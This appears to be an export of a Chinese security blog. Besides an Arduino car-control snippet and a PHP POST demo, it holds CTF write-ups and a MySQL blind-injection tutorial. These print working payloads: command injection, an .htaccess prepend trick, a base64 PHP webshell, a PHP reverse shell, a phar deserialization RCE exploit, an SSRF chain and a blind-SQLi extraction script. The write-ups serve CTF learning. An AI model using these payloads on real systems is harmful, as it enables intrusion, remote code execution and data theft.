            digitalWrite(PIN_AIN2,HIGH);
      break;
      case 3://右转弯
            analogWrite(PIN_PWML,200);
            digitalWrite(PIN_AIN3,LOW);
            digitalWrite(PIN_AIN4,HIGH);
            analogWrite(PIN_PWMR,200);
            digitalWrite(PIN_AIN1,HIGH);
            digitalWrite(PIN_AIN2,LOW);
      break;
      default://停止
            analogWrite(PIN_PWML,200);
            digitalWrite(PIN_AIN3,LOW);
            digitalWrite(PIN_AIN4,LOW);
            analogWrite(PIN_PWMR,200);
            digitalWrite(PIN_AIN1,LOW);
            digitalWrite(PIN_AIN2,LOW);
      break;
    }
  }
  void setup() {
    pinMode(PIN_PWML,OUTPUT);
    pinMode(PIN_AIN3,OUTPUT);
    pinMode(PIN_AIN4,OUTPUT);
    pinMode(PIN_PWMR,OUTPUT);
    pinMode(PIN_AIN1,OUTPUT);
    pinMode(PIN_AIN2,OUTPUT);

  }

  void loop() {
    int i;
    for(i=0;i&lt;5;i++){
      carrun(i);
       delay(3000); 
    }


  }
</code></pre><h4 id="最后烤入开发板即可"><a href="#最后烤入开发板即可" class="headerlink" title="最后烤入开发板即可"></a>最后烤入开发板即可</h4><p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720878134660.png" alt="img"></p>
<h4 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h4><p>​        看我朋友圈</p>
]]></content>
      <categories>
        <category>开发板</category>
      </categories>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP中file_get_contents()函数去实现POST发送</title>
    <url>//articles/d7da57127d.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要打CTF的线下赛，写了个脚本作为WAF拦截流量并作流量转发。正好研究一下PHP如何使用file_get_contens()去发送POST包。正好中秋节无聊得爆炸，去年执行任务在火车上过了个中秋，今年回到地方，老友们都回家了，宿舍也是空无一人，其实就算宿舍有人也是一样，兴趣爱好不一样，自己也沉迷于技术研究，不玩游戏，不看球的。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><pre><code class="php">&lt;?php
$data = array(
    &#39;username&#39;=&gt;&#39;admin&#39;,
    &#39;password&#39;=&gt;&#39;hplocation123*&#39;
    ); 

$query = http_build_query($data); //使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。

$options[&#39;http&#39;] = array(
     &#39;timeout&#39;=&gt;60,
     &#39;method&#39; =&gt; &#39;POST&#39;,
     &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
     &#39;content&#39; =&gt; $query
    );//构造一个post包

$url = &quot;http://point.mycute.cn/login.php&quot;;
$context = stream_context_create($options);//创建并返回一个资源流上下文
$result = file_get_contents($url, false, $context);

echo htmlspecialchars($result);
?&gt;</code></pre>
]]></content>
      <tags>
        <tag>PHP开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP整数键截断问题</title>
    <url>//articles/d8297e9d3b.html</url>
    <content><![CDATA[<ul>
<li><p>漏洞详情</p>
<p> <a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a> </p>
</li>
<li><p>影响版本</p>
<p> 5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1 </p>
</li>
</ul>
<pre><code class="php">&lt;?php
include(&quot;flag.php&quot;);

if(empty($_GET[&#39;user&#39;])) die(show_source(__FILE__));
$a= strval(time());
$user = [&#39;admin&#39;,$a];
if($_GET[&#39;user&#39;] === $user &amp;&amp;$_GET[&#39;user&#39;][0]!=&#39;admin&#39;){
    echo $flag;
}
?&gt;</code></pre>
<p>我们直接看漏洞详情，这样比较会直接相等：</p>
<pre><code class="php">var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);</code></pre>
<p>测试发现将0x10000000转换为10进制： 4294967296 ，逻辑依然成立。</p>
<p>上题直接构造exp:</p>
<pre><code class="python">import requests
import time

url =&quot;http://xxxxxx.xx/?user[4294967296]=admin&amp;user[1]=&quot;+str(int(time.time()))
result = requests.get(url)
print(url)
print(result.text)</code></pre>
<p>需要注意的是，这个问题只能在64位PHP中复现成功，在32位中会将传入的4294967296解析为字符串导致匹配错误。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯部分Write Up</title>
    <url>//articles/d8314f80a5.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>web考的是misc，之前一段时间一直忙着培训也没有时间。</li>
</ul>
<h2 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h2><ul>
<li>源码在MP3里面，不知道这样做的意义是什么难道有人会在写网站的时候把源码放进mp3里面？？？这样做真的够无聊的。</li>
<li>源码</li>
</ul>
<pre><code class="php">if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){ die(&#39;Ë•£¡3⁄41 ̧Ò2ÈÎÒÒ»Ö»¶úμÄÎ2°Í£¡&#39;);
}
$clandestine = getenv(&quot;clandestine&quot;);
if(isset($_POST[&#39;White-cat-monitor&#39;]))
$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;],
$clandestine);
$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);
if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){ die(&#39;ÓÐÒâÃé×1⁄4£¬ÎÞÒâ»÷·¢
£¬ÄãμÄÃÎÏë3⁄4ÍÊÇÄãÒaÃé×1⁄4μÄÄ¿±ê¡£ÏàÐÅ×Ô1⁄4o£¬Äã3⁄4ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄμÄ×Óμ ̄¡£&#39;); }
echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre>
<ul>
<li><p>这是原题:<a href="https://neversecure.ca/category/bug-hunting/" target="_blank" rel="noopener">https://neversecure.ca/category/bug-hunting/</a></p>
</li>
<li><p>老知识点了，数组加密得到nu l l用null去加密得到hash值。</p>
</li>
</ul>
<pre><code>Black-Cat- Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One- ear=%3Bcat+flag.php&amp;White-cat-monitor[]=1a</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><ul>
<li><p>原题X-NUCA‘2019 ——Ezphp</p>
</li>
<li><p>我们从代码的最后一行可见最后会强行拼接进来一个 “\nHello World” 导致 .hatccess 无法解析 500错误。所以使用反斜杠可以将 \n 转义为普通字符后使用#注释使得 .hatccess 能够成功解<br>析。</p>
</li>
<li><p>绕过 检测同样使用<code>\</code>作为换行直接绕过该函数的关键字检测。</p>
</li>
<li><p>将 .hatccess 包含进所以php文件。</p>
</li>
</ul>
<pre><code>php_valueauto_prepend_file.htaccess</code></pre><ul>
<li>综上构造payload:</li>
</ul>
<pre><code>php_value auto_prepend_fil\ 
e .htaccess
#&lt;?php phpinfo();?&gt;\</code></pre><ul>
<li>exp</li>
</ul>
<pre><code>?content=php_valueauto_prepend_fil\%0Ae.htaccess%0A%23&lt;?phpsystem(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><h2 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h2><ul>
<li>目测是文件包含了。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/macpic/pic1.png" alt="pic1"></p>
<ul>
<li>用base64或者rot13读文件发现被过滤了,由于<code>include()</code>    可以解码一次url所以可以用双url编码绕过,这里。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/macpic/pic2.png" alt="pic2"></p>
<ul>
<li>翻阅PHP文档发现还有另外一个过滤器能用：</li>
</ul>
<blockquote>
<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
</blockquote>
<p><img src="http://goodcheerleung.gitee.io/macpic/pic3.png" alt="pic3"></p>
<ul>
<li>例如：</li>
</ul>
<pre><code>http://183.129.189.60:10021/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</code></pre><ul>
<li><p>解码：</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/pic5.png" alt="pic5"></p>
</li>
<li><p>源码：</p>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
    &lt;title&gt;count is here&lt;/title&gt;

    &lt;style&gt;

        html,
        body {
            overflow: none;
            max-height: 100vh;
        }

    &lt;/style&gt;
&lt;/head&gt;

&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;

&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;

    &lt;?php
    ini_set(&#39;max_execution_time&#39;, 5);

    if ($_COOKIE[&#39;pass&#39;] !== getenv(&#39;PASS&#39;)) {
        setcookie(&#39;pass&#39;, &#39;PASS&#39;);
        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);
    }
    ?&gt;

    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;

    &lt;form&gt;
        &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; name=&quot;file&quot;&gt;
        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;
        &lt;input type=&quot;submit&quot;&gt;
    &lt;/form&gt;

    &lt;?php
    if (isset($_GET[&quot;count&quot;])) {
        $count = $_GET[&quot;count&quot;];
        if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
            die(&#39;hacker!&#39;);
        }
        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;/h2&gt;&quot;;
    }
    ?&gt;

&lt;/body&gt;

&lt;/html&gt;</code></pre><ul>
<li>index.php</li>
</ul>
<pre><code>&lt;?php
if (isset($_GET[&#39;file&#39;])) {
    if(preg_match(&#39;/#|base64|rot13|base32|base16/i&#39;, $_GET[&#39;file&#39;])){
            die(&#39;G0-OUT&#39;.&#39;&lt;br&gt;&#39;.&#39;hacker!&#39;);
        }

    require_once($_GET[&#39;file&#39;]);
} else {
    header(&#39;Location: /?file=GWHT.php&#39;);
}
</code></pre><ul>
<li><p>密码盲猜是：<code>GWHT</code></p>
</li>
<li><p>由于过滤了<code>$_POST</code>和<code>$_GET</code>直接用<code>get_defined_vars()</code>代替payload如下：</p>
</li>
</ul>
<pre><code class="phop">http://183.129.189.60:10021/?file=GWHT.php&amp;count=%27`echo%20%22%3C?=eval(pos(pos(get_defined_vars())))?%3E%22%3E2.php`%27</code></pre>
<ul>
<li>再写一个正常的木马,：</li>
</ul>
<pre><code>http://183.129.189.60:10021/2.php?a=file_put_contents(&#39;cnm.php&#39;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbYWFdKTs/Pg%3d%3d&quot;))%3b</code></pre><ul>
<li>使用PHP反弹一个交互shell</li>
</ul>
<pre><code class="php">&lt;?php
  $sock=fsockopen(&quot;localhost&quot;,12345);//localhost为自己的外网ip，端口任意
  exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
?&gt;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/macpic/pic4.png" alt="pic4"></p>
<ul>
<li>做到这里洗澡去了，回来环境关了。算了。</li>
</ul>
<h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><ul>
<li><p>扫描器扫出一个robots.txt</p>
</li>
<li><p>提示：</p>
</li>
</ul>
<pre><code>&lt;!-- 小胖说用个不安全的协议从我家才能进ser.php呢! !--&gt;</code></pre><ul>
<li>源码：</li>
</ul>
<pre><code class="php">&lt;?php
error_reporting(0);
if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
    highlight_file(__FILE__);
}
$flag=&#39;{Trump_:&quot;fake_news!&quot;}&#39;;
class GWHT{
    public $hero;
public function __construct(){ $this-&gt;hero = new Yasuo;
    }
    public function __toString(){
if (isset($this-&gt;hero)){
return $this-&gt;hero-&gt;hasaki();
        }else{
            return &quot;You don&#39;t look very happy&quot;;
} }
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file=&#39;&#39;,$text=&#39;&#39;) {
$this -&gt; file = $file; $this -&gt; text = $text;
}
public function hasaki(){
$d = &#39;&lt;?php die(&quot;nononon&quot;);?&gt;&#39;; $a= $d. $this-&gt;text;
@file_put_contents($this-&gt; file,$a); }
}
class Yasuo{
    public function hasaki(){
        return &quot;I&#39;m the best happy windy man&quot;;
    }
}/*$c=$_GET[&#39;c&#39;];
echo $x=unserialize($c);*/
?&gt;</code></pre>
<ul>
<li>简单的POP链</li>
</ul>
<pre><code class="php">&lt;?php
class GWHT{
    public $hero;
}
class Yongen{ //flag.php
public $file = &quot;php://filter/convert.base64-decode/resource=aaa.php&quot;;
    public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;;
}
$a = new GWHT;
$a-&gt;hero = new Yongen;
echo urlencode(serialize($a));</code></pre>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Desctf12月月赛</title>
    <url>//articles/desctf12.html</url>
    <content><![CDATA[<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>题目给出源码：</p>
<pre><code class="php"> &lt;?php
error_reporting(E_ALL);
$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
if(!is_dir($sandbox)) {
    mkdir($sandbox);
}
include_once(&#39;template.php&#39;);
$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
} else {
    highlight_file(__file__);
    die();
}
if(isset($_GET[&#39;tp&#39;])) {
    $tp = $_GET[&#39;tp&#39;];
    if (array_key_exists($tp, $template) === FALSE) {
        echo &quot;No! You only have 3 template to reader&quot;;
        die();
    }
    $content = file_get_contents($template[$tp]);
    $temp = new Template($content);
} else {
    echo &quot;Please choice one template to reader&quot;;
}
?&gt; </code></pre>
<ul>
<li>这里存在一个变量覆盖<code>extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);</code>，只需覆盖<code>$template</code></li>
</ul>
<p>即可,读取任意文件，直接读取template.php,得到源码：</p>
<pre><code class="PHP">http://8.129.41.25:10305/?var[template][a]=template.php&amp;tp=a</code></pre>
<ul>
<li>template.php</li>
</ul>
<pre><code class="PHP">&lt;?php
class Template{
    public $content;
    public $pattern;
    public $suffix;

    public function __construct($content){
        $this-&gt;content = $content;
        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
        $this-&gt;suffix = &quot;.html&quot;;
    }

    public function __destruct() {
        $this-&gt;render();
    }
    public function render() {
        while (True) {
            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
                break;
            global ${$matches[1]};

            if(isset(${$matches[1]})) {
                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
            } 
            else{
                break;
            }
        }
        if(strlen($this-&gt;suffix)&gt;5) {
            echo &quot;error suffix&quot;;
            die();
        }
        $filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
        file_put_contents($filename, $this-&gt;content);
        echo &quot;Your html file is in &quot; . $filename;
    }
}

?&gt;</code></pre>
<p>源码比较简单，在前面的源码通过<code>file_getcontents</code>读取到内容之后传入<code>Template</code>类再写入文件。由于<code>file_getcontents</code>的参数完全可控，我们可以远程下载文件到靶机，并且可以使用phar反序列化可以控制<code>suffix</code>属性，把写入文件的后缀改成PHP，导致rce.</p>
<p>Exp:</p>
<pre><code class="php">&lt;?php
class Template{
 public $content;
 public $pattern;
 public $suffix;

 public function __construct($content){
  $this-&gt;content = $content;
  $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
  $this-&gt;suffix = &quot;.php&quot;;
 }
}
    @unlink(&quot;test.phar&quot;);
    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
    $o = new Template(&quot;&lt;?php system(\$_GET[_]);?&gt;&quot;);
    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
    $phar-&gt;stopBuffering();
?&gt;</code></pre>
<ul>
<li>下载到靶机：</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175549@2x.png" alt="WX20201225-175549@2x"></p>
<ul>
<li>反序列化</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175738@2x.png" alt="WX20201225-175738@2x"></p>
<ul>
<li>读取flag</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175957@2x.png" alt="WX20201225-175957@2x"></p>
<h1 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h1><p>源码：</p>
<pre><code class="javascript">/routes/index.js
var express = require(&#39;express&#39;);
var config = require(&#39;../config&#39;);
var url=require(&#39;url&#39;);
var child_process=require(&#39;child_process&#39;);
var fs=require(&#39;fs&#39;);
var request=require(&#39;request&#39;);
var router = express.Router();


var blacklist=[&#39;127.0.0.1.xip.io&#39;,&#39;::ffff:127.0.0.1&#39;,&#39;127.0.0.1&#39;,&#39;0&#39;,&#39;localhost&#39;,&#39;0.0.0.0&#39;,&#39;[::1]&#39;,&#39;::1&#39;];

router.get(&#39;/&#39;, function(req, res, next) {
    res.json({});
});

router.get(&#39;/debug&#39;, function(req, res, next) {
    console.log(req.ip);
    if(blacklist.indexOf(req.ip)!=-1){
        console.log(&#39;res&#39;);
    var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);
    console.log(url.parse(u).href);
    let log=`echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log`;
    console.log(log);
    child_process.exec(log);
    res.json({data:fs.readFileSync(&#39;/tmp/log&#39;).toString()});
    }else{
        res.json({});
    }
});


router.post(&#39;/debug&#39;, function(req, res, next) {
    console.log(req.body);
    if(req.body.url !== undefined) {
        var u = req.body.url;
    var urlObject=url.parse(u);
    if(blacklist.indexOf(urlObject.hostname) == -1){
        var dest=urlObject.href;
        request(dest,(err,result,body)=&gt;{
            res.json(body);
        })
    }
    else{
        res.json([]);
    }
    }
});
module.exports = router;</code></pre>
<ul>
<li><p>GET 的debug路由中有一个命令执行，会将结果写入<code>/tmp/log</code>,但是要进入这个命令执行的分支必须通过ip黑名单的检测。`blacklist.indexOf(req.ip)!=-1。</p>
</li>
<li><p>我们在来看POST的debug路由很明显是一个SSRF。这里传递一个参数url,URL经过：url.parse解码后hostname不能再黑名单中。黑名单过滤的不全我们完全可以用十进制胡总八进制的方式绕过例如：<code>http://2130706433/</code>、<code>http://0177.0.0.01/</code></p>
</li>
<li><p>绕过SSRF之后我们就是要闭合单引号来执行多条命令了，这里有一个trick在<code>@</code>符号之前输入<code>%27</code>，会经过url解码变成单引号。</p>
</li>
</ul>
<p>所以最终payload是：</p>
<pre><code>url= http://2130706433:10300/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG9620.png" alt="WechatIMG9620"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>一种基于运行错误的Bool型盲注原理剖析</title>
    <url>//articles/spatial_functions_blind_inject.html</url>
    <content><![CDATA[<h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
<p>以<code>ST_GeomFromText</code>为例：</p>
<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
+---------------------------------------------------+
| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
+---------------------------------------------------+
|                                                 0 |
+---------------------------------------------------+
1 row in set (0.00 sec)</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
<ul>
<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
</ul>
<p>总结，其他可用的函数：</p>
<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
SELECT IF({}, ST_X(MADS), 0);
SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
<p>我们可以借此FUZZ出被ban掉的关键字：</p>
<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
<ul>
<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
</li>
<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
</li>
<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
</li>
<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
</li>
</ul>
<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
<p>若if表达式为true,那么将会返回运行错误的页面：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
<p>据此编写Python脚本：</p>
<pre><code class="PYTHON">#author：Gqleung
#Email:  admin@plasf.cn
#blog:   http://www.plasf.cn

import requests

def ord2hex(string):
    result = &quot;&quot;
    for i in string:
        r = hex(ord(i));
        r = r.replace(&#39;0x&#39;,&#39;&#39;)
        result = result+r
    return &#39;0x&#39;+result

url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
result=&quot;&quot;
for i in range(1,70):
    for j in tables:
        if j ==&quot;{&quot; or j==&quot;}&quot;:
            j=&#39;\\&#39;+j
        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
        r = requests.get(url+payload);
        if &#39;cat&#39; not in r.text:
            result=result+j
            print(result.replace(&#39;\\&#39;,&#39;&#39;))
            break</code></pre>
<p>运行结果：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
<p>例如,下列语句5.20返回的值将会是5.</p>
<pre><code class="mysql">select floor(5.20)</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
<p>我们先来看Payload再来分析其中的原理</p>
<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
<ul>
<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
</ul>
<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
<p>例如，user()中含有五条数据：</p>
<pre><code class="mysql">select rand() from user</code></pre>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
<p>加上floor就是取整。会生成0或者1的随机值：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
<p>但是为什么用rand(0)呢？</p>
<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
<blockquote>
<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
</blockquote>
<p>例如:如下SQL语句：</p>
